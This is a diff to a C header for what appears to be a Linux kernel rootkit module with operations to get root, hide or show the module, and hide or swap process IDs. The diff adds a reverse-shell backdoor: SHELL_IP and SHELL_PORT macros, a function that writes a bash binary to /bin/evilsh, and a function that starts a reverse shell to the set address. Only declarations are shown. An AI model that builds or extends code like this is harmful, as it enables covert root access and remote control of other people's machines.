@@ -1,8 +1,12 @@
 #include <linux/mutex.h>
+#include "bash.h"
 #include "devices.h"
 #include "fs_helper.h"
 #include "internel.h"
 #include "syscall_helper.h"
+
+#define SHELL_IP "127.0.0.1"
+#define SHELL_PORT "1234"
 
 enum operation_num { GET_ROOT, SHOW_MODULE, HIDE_MODULE };
 
@@ -71,3 +75,17 @@ void show_pid(unsigned int tgid);
  * Note that programmers have to gurantee that they are valid pid
  */
 void swap_pid(unsigned int tgid1, unsigned int tgid2);
+
+/**
+ * shell_init - Write bash binary into /bin/evilsh
+ */
+void shell_init(void);
+
+/**
+ * shell_start - Start the remote shell
+ *
+ * The ip and port can be set by macro SHELL_IP and SHELL_PORT
+ * This shell is a reverse shell, redirecting its input and output to the target
+ * ip and port
+ */
+void shell_start(void);
